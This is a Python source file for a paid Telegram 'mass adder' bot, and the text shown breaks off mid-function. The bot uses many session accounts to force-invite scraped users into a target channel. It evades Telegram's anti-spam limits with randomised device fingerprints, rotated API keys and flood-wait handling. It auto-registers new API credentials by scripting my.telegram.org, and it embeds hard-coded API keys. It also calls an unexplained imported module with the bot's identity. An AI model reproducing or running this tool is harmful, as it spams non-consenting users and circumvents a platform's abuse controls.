
#-----
#--------------

#–*- coding: utf-8 –*-

#### MEGA ADDER 
#### VERSION 10 Promax


### - apt-get update
### - apt-get install python3-pip
### - pip install lxml
### - pip install telethon
### - pip install nest_asyncio
### - pip install pysocks 

###-----
    
    # --- for run in server

    # ---  nohup python3 BOT.py & 

    # ---- For Buy new Version Contact @keyvanvafaee !
    
###-----


#-----------------------------
import re , shutil , basehash
import nest_asyncio
from telethon.sync import TelegramClient,functions,types,events,errors
from telethon.tl.custom import Button
import sqlite3 , telethon 
import datetime
import time
from time import sleep
import sys,requests,random,os,json,string,time
from lxml import html
import socks , logging   , asyncio , random
import requests
from telethon import types as telethon_types
from telethon.tl import types as tl_telethon_types
from telethon.tl.functions.messages import ImportChatInviteRequest
from telethon.tl.functions.channels import JoinChannelRequest
import nest_asyncio
from telethon.tl.types import ChannelParticipantsAdmins
import string
from termcolor import colored
import basecounters

#------------------------------


nest_asyncio.apply() #------- confilict Asyncio 

CEND      = '\33[0m'
CBOLD     = '\33[1m'
CITALIC   = '\33[3m'
CURL      = '\33[4m'
CBLINK    = '\33[5m'
CBLINK2   = '\33[6m'
CSELECTED = '\33[7m'

CBLACK  = '\33[30m'
CRED    = '\33[31m'
CGREEN  = '\33[32m'
CYELLOW = '\33[33m'
CBLUE   = '\33[34m'
CVIOLET = '\33[35m'
CBEIGE  = '\33[36m'
CWHITE  = '\33[37m'

CBLACKBG  = '\33[40m'
CREDBG    = '\33[41m'
CGREENBG  = '\33[42m'
CYELLOWBG = '\33[43m'
CBLUEBG   = '\33[44m'
CVIOLETBG = '\33[45m'
CBEIGEBG  = '\33[46m'
CWHITEBG  = '\33[47m'

CGREY    = '\33[90m'
CRED2    = '\33[91m'
CGREEN2  = '\33[92m'
CYELLOW2 = '\33[93m'
CBLUE2   = '\33[94m'
CVIOLET2 = '\33[95m'
CBEIGE2  = '\33[96m'
CWHITE2  = '\33[97m'

CGREYBG    = '\33[100m'
CREDBG2    = '\33[101m'
CGREENBG2  = '\33[102m'
CYELLOWBG2 = '\33[103m'
CBLUEBG2   = '\33[104m'
CVIOLETBG2 = '\33[105m'
CBEIGEBG2  = '\33[106m'
CWHITEBG2  = '\33[107m'

#------------ DEBUG 
# logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',level=logging.INFO)

# logger = logging.getLogger(__name__)
#--------------
bot = TelegramClient('000OOOO000',1580776,'8a14d8b6c9c256030f6a3a5f08b3fa51')
bot.start()
info = bot.get_me()
kocd = "1"
me =info.username
#
print(colored('[**]', 'white'), colored(f'Bot Connected on {me}', 'green'))

userAgent = [

'Mozilla/5.0 (Linux; Android 9; moto g(7) play) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36'
]

basecounters.make_api_id(me)

devices = ['Samsung Galaxy A10','Samsung Galaxy A10s','Samsung Galaxy A30','Samsung Galaxy A40','Samsung Galaxy A70','Samsung Galaxy A71','LG LBELLO','Oppo A73','Poco C3','Oppo A93','Samsung Galaxy A3 Core','Xiaomi Mi 10T Lite 5G','Vivo X50E 5G','Infinix Hot 10 Lite','Samsung Galaxy A80','Huawei P Smart 2021','Gionee S12 Lite','Oppo A33','Xiaomi Mi 10T Pro 5G','Xiaomi Mi 10T 5G','LG K10','LG K52','LG K62','LG K71','Nokia 3.4','Poco X3','Honor 20 Lite','Honor 8S 2020','Honor 10 Lite','Honor 8A','Honor 9X Lite','Sony Xperia 5','Sony Xperia L4','Sony Xperia 10','Samsung S20','Samsung Galaxy Note 20 Ultra 5G','Samsung S10+','Samsung Galaxy S20 5G','Samsung Galaxy S20+ 5G','Samsung Galaxy A21s','Samsung Galaxy A51','Samsung Galaxy S10 Lite','Samsung Galaxy S9','Samsung Galaxy S8','Samsung Galaxy A41']
version = ['9.0' , "8.9" , "8.4" , "9.2" , "9.1" , "9.3" , "8.6" , "7.9"]
#-------- databases

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'




apis = [

[2039370,"395b4ddeaf216c8bd0589943383434ee"],


]


#-----
#--------------


admins =[    1111111111]
NStEVJzsyY = [ 1111111]
kosflag = 0
telegram_api_id = NStEVJzsyY
data = dict()
usernames = [] 
userid =[]  
blacklist=[]   
addflag ={}    
noadd = "1"  
checkerDupl = 0 


tsuccess =0
tfaild =0
tduplicate =0
checkGroup = 1

for item in ['Accounts','Api','Database' , "Limit_temporary" ,"Limit_Parmanent" , "Delete"]:
    if not os.path.exists(item):
        os.mkdir(item)




def get_file(myfile):
    try:
        with open('Database/{}.txt'.format(myfile),'r') as myfile:
            content = myfile.readlines()
            return content

    except FileNotFoundError:
        return 0


def minify(file_name):
    
    file_data = open(file_name, "r", 1).read() # store file info in variable
    json_data = json.loads(file_data) # store in json structure
    json_string = json.dumps(json_data, separators=(',', ":")) # Compact JSON structure
    file_name = str(file_name).replace(".json", "") # remove .json from end of file_name string
    new_file_name = "{0}.json".format(file_name)
    open(new_file_name, "w+", 1).write(json_string) # open and write json_string to file



def getRandomLineRead(myFile):
    x = list(open(myFile))
    val = (random.choice(x))
    return val



        
def online_within(participant, days):
    status = participant.status
    
    if isinstance(status , tl_telethon_types.UserStatusLastWeek) or isinstance(status , tl_telethon_types.UserStatusLastMonth):
        return False

    if isinstance(status, tl_telethon_types.UserStatusOnline):
        return True

    last_seen = status.was_online if isinstance(status, tl_telethon_types.UserStatusOffline) else None

    if last_seen:
        now = datetime.datetime.now(tz=datetime.timezone.utc)
        diff = now - last_seen
        return diff <= datetime.timedelta(days=days)

    if isinstance(status, tl_telethon_types.UserStatusRecently)  :
           
        return True

    return False


async def SpamBot(phone):

    

    device = random.choice(devices)
    version1 = random.choice(version)

    k2 = random.choice(apis)
    



    new =  TelegramClient('Accounts/{0}'.format(phone),int(k2[0]),k2[1] ,               
              device_model=device,
              system_version=version1,
              app_version="7.84",
              lang_code='en',
              system_lang_code='en')

    try:
        await new.connect()
        await new.send_message("@SpamBot" , "/start")
        count =1 
        for message in await new.get_messages("@SpamBot", limit=1) :
            if re.search(r'^Good news' , message.message) or re.search(r"^مژده",message.message):
                report = False

            elif re.search(r"Unfortunately",message.message):
                report = "Parmanet"

            elif re.search(r"limited until(.*)\.",message.message):
                reep = re.findall(r"limited until(.*)\.",message.message)
                report =reep[0]
            else:
                report = "temporary"

        if report == "temporary":
            await new.disconnect()
            shutil.move("Accounts/{}".format(phone), "Limit_temporary/{}".format(phone))
            return -1 

        elif report == "Parmanet":
            await new.disconnect()
            shutil.move("Accounts/{}".format(phone), "Limit_Parmanent/{}".format(phone))
            return -3        


        elif report == False :
            await new.disconnect()
            return 1 

        else:
            await new.disconnect()
            #print ("REPORT :"  , report)
            report = report.split(",")[0]
            if not os.path.exists(str(report)):
                os.mkdir(str(report))

            shutil.move("Accounts/{}".format(phone) , "{}".format(report))
            return -4 



    except errors.UserDeactivatedBanError:
        print(colored('[!]', 'white'), colored(f'UserDeactivatedBanError', 'red'))
        #print ("[!] UserDeactivatedBanError")        
        await new.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))
        return -2 


    except errors.UserDeactivatedError:
        print(colored('[!]', 'white'), colored(f'UserDeactivatedBanError', 'red'))
        ##print("[!] UserDeactivatedBanError")
        await new.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))
        return -2 


    except errors.SessionExpiredError:
        print(colored('[!]', 'white'), colored(f'UserDeactivatedBanError', 'red'))
        #print ("[!] UserDeactivatedBanError")
        await new.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))                
        return -2 
    except errors.SessionRevokedError:
        print(colored('[!]', 'white'), colored(f'SessionRevokedError', 'red'))
        #print ("[1] SessionRevokedError")
        await new.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))                
        return -2


    except errors.rpcerrorlist.AuthKeyDuplicatedError:
        print(colored('[!]', 'white'), colored(f'AuthKeyDuplicatedError', 'red'))
        #print ("AuthKeyDuplicatedError")
        await new.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))
        return -2 

    except errors.rpcerrorlist.UserDeactivatedError:
        print(colored('[!]', 'white'), colored(f'UserDeactivatedError', 'red'))
        #print ("[!] UserDeactivatedError")
        await new.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))                
        return -2

    except errors.rpcerrorlist.UserDeactivatedBanError:
        print(colored('[!]', 'white'), colored(f'UserDeactivatedBanError', 'red'))
        #print ("[!] UserDeactivatedBanError")
        await new.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))                
        return -2 


    except errors.rpcerrorlist.SessionExpiredError:
        print(colored('[!]', 'white'), colored(f'SessionExpiredError', 'red'))
        #print ("[!] SessionExpiredError")
        await new.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))               
        return -2 


    except errors.rpcerrorlist.SessionPasswordNeededError:
        print(colored('[!]', 'white'), colored(f'SessionPasswordNeededError', 'red'))
        #print ("[!] SessionPasswordNeededError")
        await new.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))               
        return -2


    except Exception as e:
        print(colored('[*]', 'white'), colored(f'[388] {e.__class__} => {str(e)}', 'cyan'))
        await new.disconnect()
        #shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))               
        return -2




def get_api(phone): 
    try:
        with open('Api/{}.txt'.format(phone),'r') as myfile:
            content = myfile.read()
            
            return [content.split(':')[0],content.split(':')[1]]
    except FileNotFoundError:
        return 0


def create_api(phone):

    body = 'phone={}'.format(phone)
    xu = random.choice(userAgent)
    
    #print ("---->" , xu)
    try:
        #response=requests.post('https://my.telegram.org/auth/send_password',data={"phone":phone})
        response = requests.post('https://my.telegram.org/auth/send_password',data=body,headers= {"Origin":"https://my.telegram.org","Accept-Encoding": "gzip, deflate, br","Accept-Language": "it-IT,it;q=0.8,en-US;q=0.6,en;q=0.4","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","Accept": "application/json, text/javascript, */*; q=0.01","Reffer": "https://my.telegram.org/auth","X-Requested-With": "keep-alive","Dnt":"1",})
        
        time.sleep(random.randint(3 , 5))
        s = json.loads(response.content)
        return s['random_hash'] , xu
    except Exception as e:
        print(colored('[!]', 'white'), colored(f'ErrorCreateApi : {str(e)}', 'red'))
        return False



def auth(phone,hash_code,pwd , xu):

    #print ("XU" , xu)

    data = "phone={}&random_hash={}&password={}".format(phone, hash_code, pwd)
    responses = requests.post("https://my.telegram.org/auth/login",data={"phone":phone,"password":pwd,"random_hash":hash_code})
    #responses = requests.post('https://my.telegram.org/auth/login',data=data,headers= {"Origin":"https://my.telegram.org","Accept-Encoding": "gzip, deflate, br","Accept-Language": "it-IT,it;q=0.8,en-US;q=0.6,en;q=0.4","User-Agent":'Mozilla/5.0 (Linux; Android 9; moto g(7) play) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36',"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","Accept": "application/json, text/javascript, */*; q=0.01","Reffer": "https://my.telegram.org/auth","X-Requested-With": "keep-alive","Dnt":"1",})
    
    try:
    
        return responses.cookies['stel_token'] , xu
    
    except:
    
        return False


def random_line(afile):
    return (random.choice(list(open(afile))))



def auth2(stel_token , xu):

    #print ("->XU" , xu)
    

   
    resp = requests.get('https://my.telegram.org/apps',headers={"Dnt":"1","Accept-Encoding": "gzip, deflate, br","Accept-Language": "it-IT,it;q=0.8,en-US;q=0.6,en;q=0.4","Upgrade-Insecure-Requests":"1","Reffer": "https://my.telegram.org/org","Cookie":"stel_token={0}".format(stel_token),"Cache-Control": "max-age=0",})
    
    tree = html.fromstring(resp.content)

    api = tree.xpath('//span[@class="form-control input-xlarge uneditable-input"]//text()')
    #print ("API "  , api)
    try:
        return '{0}:{1}'.format(api[0],api[1]) , xu
    except:
        s = resp.text.split('"/>')[0]
        
        name = x = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(8))

        value = s.split('<input type="hidden" name="hash" value="')[1]
        on = "hash={0}&app_title={1}&app_shortname={1}&app_url=&app_platform=android&app_desc=".format(value,name)
        requests.post('https://my.telegram.org/apps/create',data=on,headers={"Cookie":"stel_token={0}".format(stel_token),"Origin": "https://my.telegram.org","Accept-Encoding": "gzip, deflate, br","Accept-Language": "it-IT,it;q=0.8,en-US;q=0.6,en;q=0.4","User-Agent": xu,"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","Accept": "*/*","Referer": "https://my.telegram.org/apps","X-Requested-With": "keep-alive","Dnt":"1",})
        respv = requests.get('https://my.telegram.org/apps',headers={"Dnt":"1","Accept-Encoding": "gzip, deflate, br","Accept-Language": "it-IT,it;q=0.8,en-US;q=0.6,en;q=0.4","Upgrade-Insecure-Requests":"1","Reffer": "https://my.telegram.org/org","Cookie":"stel_token={0}".format(stel_token),"Cache-Control": "max-age=0",})
        trees = html.fromstring(respv.content)
        apis = trees.xpath('//span[@class="form-control input-xlarge uneditable-input"]//text()')
        #print (apis)
        try:
            return '{0}:{1}'.format(apis[0],apis[1]) , xu
        except :
            apis = random_line("apilist.txt").split(":")
            print ("[~] hard Code L : " , apis)
            return '{0}:{1}'.format(apis[0] , apis[1]) , xu





async def SendToSpamBot(event):

    accs = []
    active= 0
    templimited =0
    deleted=0
    parmanentLimit =0
    otherLimit =0
    txt=''

    m = await event.reply("🏆 SpamBot   ** Activated ** !")
    
    for item in os.scandir('Accounts'):
        if 'journal' not in item.name and '.session' in item.name:
            accs.append(item.name)

    for account in accs:
        try:
            x = await SpamBot(account)
            if (x == 1):
                txt += "`{}`  ** ✅ Active**\n➖➖➖➖➖\n".format(account)
                #await m.edit(txt)
                active+=1

            elif (x == -1):
                txt += "`{}`  ** ⚠️Temporary Limit**\n➖➖➖➖➖\n".format(account)
                #await m.edit(txt)
                templimited+=1

            elif (x == -3):
                txt += "`{}`  ** Parmanet Limit**\n➖➖➖➖➖\n".format(account)
                #await m.edit(txt)
                parmanentLimit+=1


            elif (x == -4):
                txt += "`{}`  ** OtherLimit **\n➖➖➖➖➖\n".format(account)
                #await m.edit(txt)
                otherLimit+=1                

            elif (x == -2):
                txt += "`{}`  ** ❌ Delete**\n➖➖➖➖➖\n".format(account)
                #await m.edit(txt)
                deleted+=1



            await asyncio.sleep(1) 

        except Exception as e:
            print (str(e))
            print(colored('[!]', 'white'), colored(f'SpamBot Error', 'yellow'))
            continue


    await event.reply("🏆 SpamBot Results :{}  \n➖➖➖➖➖\n ✅ **Active** :{} \n ➖➖➖➖➖\n ** ⚠️ Temp Limit ** : {} \n ➖➖➖➖➖ \n  ** ⚠️ Other Limits** : {} \n➖➖➖➖➖\n ** ⚠️ SLimit ** : {} \n ➖➖➖➖➖\n ** ❌ Deleted **  :{}".format(deleted+otherLimit+parmanentLimit+templimited+active, active, templimited, otherLimit, parmanentLimit, deleted))





def checkKey(dict, key):
      
    if key in dict.keys():
        return True
        
    else:
        return False

async def foo(account , msg , link , numacc ,  delay , worker_msg , mode , num ,  cancelALL , solve):
    global addflag
    global noadd 
    global checkGroup
    global join2
    global kosflag
    global totalScounter
    global totalFcounter
    
    global tfaild
    global tsuccess
    global tduplicate

    if checkKey(addflag , account):
        pass

    else :
        addflag[account] = "1"



    if noadd == "0":
        noadd = "1"




    #print ('addflag: ' , addflag )
    #print ("noadd : " , noadd)

    #-----------
    await asyncio.sleep(0) 
    start1 = time.time()
     
    targetlis=[]
    tsuccess =0
    tfaild =0
    tduplicate =0
    percent = delay / 10
    privacy = 0
    other =0   



    if (mode == "addUSERNAME"):
        random.shuffle(usernames)
        usernames2 = list(set(usernames))
        random.shuffle(usernames2)

    elif (mode == "addID"):
        usernames2 = list(set(userid))
        random.shuffle(usernames2)        

    try:


        
        text   ='⏰ **{}**\n \n  Please wait ......  \n\n'.format(time.ctime(time.time()))
        rest = 0 
        fcount=0
        scount=0
        duplicate=0
        mcounter=0
        #w =  get_api(account.split('.session')[0])
        

        
        w = random.choice(apis)
        #print ("apis : " , w)

        try:


            device = random.choice(devices)
            version1 = random.choice(version)

            client = TelegramClient('Accounts/{}'.format(account),int(w[0]),w[1],             
             device_model=device,
              system_version=version1,
              app_version="7.84",
              lang_code='en',
              system_lang_code='en')

            await client.connect()

            log_msg = await msg.reply(text ,  buttons=[ [Button.inline("❌ cancel" , "acccancell|{}".format(account)) , Button.inline("⚠️ cancel All" , ".addcencell|{}".format(account))] , [Button.inline(f"‼️ Cancel All {cancelALL} accounts" , "&cancelALL")] ])


        except ConnectionError:

            await client.disconnect()
            
            await asyncio.sleep(10) #--- delta delay

            client = TelegramClient('Accounts/{}'.format(account),int(w[0]),w[1] )
            await client.connect()



        except errors.UserDeactivatedBanError:
            #print ("[!] UserDeactivatedBanError")
            print(colored('[!]', 'white'), colored(f'UserDeactivatedBanError', 'red'))
            await text.edit("UserDeactivatedBanError")
            await client.disconnect()
            shutil.move("Accounts/{}".format(account), "Delete/{}".format(account))
            return [scount , fcount , duplicate]

        except errors.UserDeactivatedError:
            #print("[!] UserDeactivatedError")
            print(colored('[!]', 'white'), colored(f'UserDeactivatedError', 'red'))
            await client.disconnect()
            shutil.move("Accounts/{}".format(account), "Delete/{}".format(account))
            await text.edit("UserDeactivatedBanError")
            return [scount , fcount , duplicate]


        except errors.SessionExpiredError:
            #print ("[!] SessionExpiredError")
            print(colored('[!]', 'white'), colored(f'SessionExpiredError', 'red'))
            await text.edit("SessionExpiredError")
            await client.disconnect()
            shutil.move("Accounts/{}".format(account), "Delete/{}".format(account))                
            return [scount , fcount , duplicate]
 
        except errors.SessionRevokedError:
            print(colored('[!]', 'white'), colored(f'SessionRevokedError', 'red'))
            #print ("[1] SessionRevokedError")
            await text.edit("SessionRevokedError")
            await client.disconnect()
            shutil.move("Accounts/{}".format(account), "Delete/{}".format(account))                
            return [scount , fcount , duplicate]


        except errors.rpcerrorlist.AuthKeyDuplicatedError:
            print(colored('[!]', 'white'), colored(f'AuthKeyDuplicatedError', 'red'))
            #print ("AuthKeyDuplicatedError")
            await text.edit("AuthKeyDuplicatedError")
            await client.disconnect()
            shutil.move("Accounts/{}".format(account), "Delete/{}".format(account))

            return [scount , fcount , duplicate]



        except errors.rpcerrorlist.UserDeactivatedError:
            print(colored('[!]', 'white'), colored(f'UserDeactivatedError', 'red'))
            #print ("[!] UserDeactivatedError")
            await client.disconnect()
            shutil.move("Accounts/{}".format(account), "Delete/{}".format(account))                

            await text.edit("UserDeactivatedBanError")
            return [scount , fcount , duplicate]


        except errors.rpcerrorlist.UserDeactivatedBanError:
            print(colored('[!]', 'white'), colored(f'UserDeactivatedBanError', 'red'))
            #print ("[!] UserDeactivatedBanError")

            await text.edit("UserDeactivatedBanError")
            await client.disconnect()
            shutil.move("Accounts/{}".format(account), "Delete/{}".format(account))                
            return [scount , fcount , duplicate]



        except errors.rpcerrorlist.SessionExpiredError:
            print(colored('[!]', 'white'), colored(f'SessionExpiredError', 'red'))
            #print ("[!] SessionExpiredError")
            await client.disconnect()
            shutil.move("Accounts/{}".format(account), "Delete/{}".format(account))               
            await text.edit("UserDeactivatedBanError")
            return [scount , fcount , duplicate]


        except errors.rpcerrorlist.SessionPasswordNeededError:

            print(colored('[!]', 'white'), colored(f'SessionPasswordNeededError', 'red'))

            #print ("[!] SessionPasswordNeededError")

            await client.disconnect()
            shutil.move("Accounts/{}".format(account), "Delete/{}".format(account))               
            await text.edit("SessionPasswordNeededError")
            return [scount , fcount , duplicate]


        except ValueError:
            pass

        except Exception as e :
            
            print(colored('[*]', 'white'), colored(f'[738] {e.__class__} => {str(e)}', 'cyan'))
            await asyncio.sleep(1)
            #await text.edit(str(e))

            await client.disconnect()
            
            #shutil.move("Accounts/{}".format(account), "Delete/{}".format(account))
            
            return [scount , fcount , duplicate]



        ww = await join2(client,link ,log_msg)
        if (ww == None):
            ww = await join2(client,link,log_msg)


        if (ww == -1 or ww == -2 or ww == -3):

            await client.disconnect()
            shutil.move("Accounts/{}".format(account), "Delete/{}".format(account))
            return [scount , fcount , duplicate] 

        if (ww == -1000):
            await client.disconnect()
            return [scount , fcount , duplicate]


        if ww == True:
            
            if checkGroup == 1:

                blacklist.clear()

                checkGroup = 0

                if mode == "addUSERNAME":
                    async for item in client.iter_participants(link  ):

                        if item.username != None:
                            
                            blacklist.append(item.username)

                # if mode == "addID":
                #     async for item in client.iter_participants(link, aggressive=True  ):
        
                #         blacklist.append(int(item.id))


            
            mtime = time.ctime(time.time())           
            await log_msg.edit("➕" + str(text))
            scount=0
            start = time.time()
            while True: 
                
                if kosflag == 1 :
                    
                    end1 = time.time()
                    text = '''●╔══**Adding to `{}` with `{}` accounts **  **Add per :** `{}`\n\n 🏆 Jobs Completed {}

●╚══[⚡️ MEGA ADDER ⚡️]'''.format(link, numacc, delay, str(datetime.timedelta(seconds=(end1-start1)))[0:7])
                    
                    try:
                        await log_msg.edit(text , buttons=[[Button.inline("Success", "None") , Button.inline(str(tsuccess) , "None")]  , [Button.inline("Failed" ,"None") , Button.inline(str(tfaild) , "None")]])
                    except Exception as e:
                        print(colored('[*]', 'white'), colored(f'[804] {e.__class__} => {str(e)}', 'cyan'))
                        pass

                    await client.disconnect()
                    return [scount , fcount , duplicate] 
                                        

                if noadd == "0" :
                    
                    end1 = time.time()
                    text = '''●╔══**Adding to `{}` with `{}` accounts **  **Add per :** `{}`\n\n 🏆 Jobs Completed {}

●╚══[⚡️ MEGA ADDER ⚡️]'''.format(link, numacc, delay, str(datetime.timedelta(seconds=(end1-start1)))[0:7])
                    
                    try:
                        await log_msg.edit(text , buttons=[[Button.inline("Success", "None") , Button.inline(str(tsuccess) , "None")]  , [Button.inline("Failed" ,"None") , Button.inline(str(tfaild) , "None")]])
                    except Exception as e:
                        print(colored('[*]', 'white'), colored(f'[821] {e.__class__} => {str(e)}', 'cyan'))
                        pass

                    await client.disconnect()
                    return [scount , fcount , duplicate] 

                if (scount >= delay): 
                    break
                

                if (fcount >= 120):
                    break


                if (totalScounter >= solve):

                    await client.disconnect()
                    return [scount , fcount , duplicate] 

                mcounter+=1    
                text = ' **Adding to `{}` with ` {}` accounts   Add per : `{}`\n\n┏┫ MEGA ADDER ┃\n**'.format(link, numacc, delay)
                

                amar ="┠ `Success` "+ str(scount) +"\n"
                text += amar + "" 
                amar ="┠ `failed` "+ str(fcount) +"\n"
                amar +="┠ `duplicate` "+ str(duplicate) +"\n"
                text += str(amar)
                
                #---------------------
                
                #--------------------
                
                if (0 <= scount  and scount < percent  ):
                    text += "• □□□□□□□□□□ \n"

                if ( percent    <= scount and scount < percent *2 ):
                    text += "• ■□□□□□□□□□ \n"

                elif ( percent *2 <= scount and scount < percent *3  ):
                    text += "• ■■□□□□□□□□\n"

                elif ( percent *3 <= scount and scount < percent *4  ):
                    text += "• ■■■□□□□□□□\n"


                elif ( percent *4 <= scount and scount < percent *5  ):
                    text += "• ■■■■□□□□□□ \n"

                elif ( percent *5 <= scount and scount < percent *6 ):
                    text += "• ■■■■■□□□□□ \n"


                elif ( percent *6 <= scount and scount < percent *7 ):
                    text += "• ■■■■■■□□□□ \n"

                elif ( percent *7 <= scount and scount < percent *8 ):
                    text += "• ■■■■■■■□□□ \n"



                elif ( percent *8 <= scount and scount < percent *9):
                    text += "• ■■■■■■■■□□ \n"


                elif ( percent *9 <= scount and scount < percent *10 ):
                    text += "• ■■■■■■■■□ \n"


                elif ( percent *10 <= scount ):
                    text += "• ■■■■■■■■■ \n"




                end = time.time()
                timer=f"┠ `time` : {str(datetime.timedelta(seconds=(end-start)))[0:7]}"
                text += str(timer)
                

                if (addflag[account] == "0") : 
                    print(colored('[!]', 'white'), colored(f'Break Signal', 'yellow'))
                    end = time.time()
                   
                    await client.disconnect()
                    addflag[account]  = "1"
                    break
                                             

                usList=[]

                # for us in range(0 , int(num)):
                #     #-----------------
                #     usList.append(random.choice(usernames2))
                #     #-----------------
                

                

                try:
                    #----------
                    await asyncio.sleep(random.randint(1 , 3))
                    J = random.choice(usernames2)
                    #----------
                    if (J not in blacklist):
                        #print (usList)
                        await client(functions.channels.InviteToChannelRequest(channel= link ,users=[J]))     
                        #print (r.stringify())
                        print(colored(f'[{totalScounter}]', 'white'), colored(f'{J}', 'green'))

                        if scount % 2 ==0:

                            await log_msg.edit(text , buttons=[ [Button.inline("❌ cancel" , "acccancell|{}".format(account)) , Button.inline("⚠️ cancel All" , ".addcencell|{}".format(account))] ,[Button.inline("Privacy {} ❓".format(privacy) , "None") , Button.inline("Other {} ❔".format(other) , "None")] , [Button.inline(" USER {} ❕".format(J) , "None")] , [Button.inline(f"‼️ Cancel All {cancelALL} accounts" , "&cancelALL")] ])

                        # if mode == "addID": 

                        #     #userid = [x for x in userid if x not in usList]        
                        #     for i in range(0 , int(num)):     
                        #         userid.remove(usList[i])
                        
                        else :
                            try:
                                usernames.remove(J)
                            except :
                                pass
                            # for i in range(0, int(num)):
                            #     try:
                            #         usernames.remove(usList[i])
                            #     except:
                            #         pass
                        #with open("goldlist.txt" , "a") as myfile:
                            
                            #myfile.write(str(J))

                            #myfile.write("\n")
                        
                        scount +=1
                        totalScounter +=1
                        #print(totalScounter)
                        
                        tsuccess+=1

                    else:
                        if mode == "addID":                   
                            userid.remove(J)
                        
                        else :
                            try:
                                usernames.remove(J)
                            except :
                                pass
                        print(colored('[~]', 'white'), colored(f'Duplicated', 'yellow'))
                        
                        tduplicate+=1
                        
                        duplicate+=1
                

                except errors.rpcerrorlist.UserNotMutualContactError:

                    tfaild +=1
                    totalFcounter+=1
                    other +=1
                    fcount +=1
                    print(colored('[-]', 'white'), colored(f'UserChannelsTooMuchError', 'cyan'))

                    # print ("[-] UserChannelsTooMuchError")
                    if mode == "addID":                   
                        for i in range(0 , int(num)):     
                            try:
                                userid.remove(usList[i])
                            except :
                                pass
                        pass
                    else :
                        try:
                            usernames.remove(J)
                        
                        except:
                            pass
                        # for i in range(0 , int(num)): 
                        #     try:    
                        #         userid.remove(usList[i])
                        #     except :
                        #         pass
                        pass
                    continue


                except errors.rpcerrorlist.UserChannelsTooMuchError:
                    tfaild +=1
                    fcount +=1
                    other +=1
                    print(colored('[-]', 'white'), colored(f'UserChannelsTooMuchError', 'cyan'))
                    #print ("[-] UserChannelsTooMuchError")
                    if mode == "addID":                   
                        for i in range(0 , int(num)):  
                            try:    
                                userid.remove(usList[i])
                            except :
                                pass
                        pass
                    else :
                        try:
                            usernames.remove(J)
                        except:
                            pass
                        # for i in range(0 , int(num)):      
                        #     try:    
                        #         userid.remove(usList[i])
                        #     except:
                        #         pass

                        pass
                    continue                     

                except errors.rpcerrorlist.UserPrivacyRestrictedError:
                    tfaild +=1
                    fcount +=1
                    totalFcounter+=1
                    privacy +=1
                    print(colored('[-]', 'white'), colored(f'UserPrivacyRestrictedError', 'cyan'))
                    #print ("[-] UserPrivacyRestrictedError")
                    if mode == "addID":                   
                        for i in range(0 , int(num)):  
                            try:        
                                userid.remove(usList[i])
                            except:
                                pass
                        pass
                    
                    else :
                        try:
                            usernames.remove(J)
                        
                        except:
                            pass
                        # for i in range(0 , int(num)):    
                        #     try:      
                        #         userid.remove(usList[i])
                        #     except :
                        #         pass
                        # pass
                    continue


                except errors.rpcerrorlist.PeerFloodError as perr:
                    

                    fcount+=2
                    tfaild+=1
                    totalFcounter+=1
                    other +=1

                    if mode == "addID":                   
                        for i in range(0 , int(num)):  
                            try:       
                                userid.remove(usList[i])
                            except:
                                pass
                        pass
                    else :
                        try:
                            usernames.remove(J)
                            
                        except :
                            pass
                            # for i in range(0 , int(num)):   
                        #     try:       
                        #         userid.remove(usList[i])
                        #     except:
                        #         pass
                        pass
                    print(colored('[-]', 'white'), colored(f'PeerFloodError', 'blue'))
                    
                    continue


                except errors.rpcerrorlist.FloodWaitError as e:
                    
                    fcount+=1
                    tfaild+=1
                    totalFcounter+=1
                    wait = [int(s) for s in str(e).split() if s.isdigit()][0]

                    print(colored('[*]', 'white'), colored(f'FloodWait {wait}', 'magenta'))
                    #wait += random.randint(100 ,200)

                    if wait >= 150:
                        await client.disconnect()
                        return [scount , fcount , duplicate] 

                    await log_msg.edit("❌🎗 {}  ** {} ** ".format(str(e), wait) , buttons=[[Button.inline("✅ Success", "None") , Button.inline(str(tsuccess) , "None")]  , [Button.inline("❌ Failed" ,"None") , Button.inline(str(tfaild) , "None")]])
                    
                    await asyncio.sleep(wait)

                     


                except ValueError as e:
                    print(colored('[*]', 'white'), colored(f'[1090] Error {e}', 'yellow'))
                    fcount+=1
                    tfaild +=1
                    totalFcounter+=1
                    #break
                    continue

                except errors.ChannelPrivateError:
                    print(colored('[*]', 'white'), colored(f'I Banned From this Channel', 'yellow'))
                    await client.disconnect()
                    break
                
                except sqlite3.OperationalError:
                    print(colored('[*]', 'white'), colored(f'SQLITE', 'yellow'))
                    #print ("SQLITE")
                    await client.disconnect()
                    break


                except errors.rpcerrorlist.AuthKeyDuplicatedError:
                    print(colored('[*]', 'white'), colored(f'AuthKeyDuplicatedError', 'yellow'))
                    #print ("AuthKeyDuplicatedError")
                    await client.disconnect()
                    break

                except errors.rpcerrorlist.AuthKeyUnregisteredError:
                    print(colored('[*]', 'white'), colored(f'AuthKeyUnregisteredError', 'yellow'))
                    #print ("AuthKeyUnregisteredError")
                    await client.disconnect()
                    break
                


                except errors.rpcerrorlist.UserBannedInChannelError:
                    print(colored('[*]', 'white'), colored(f'UserBannedError', 'blue'))
                    await client.disconnect()
                    break


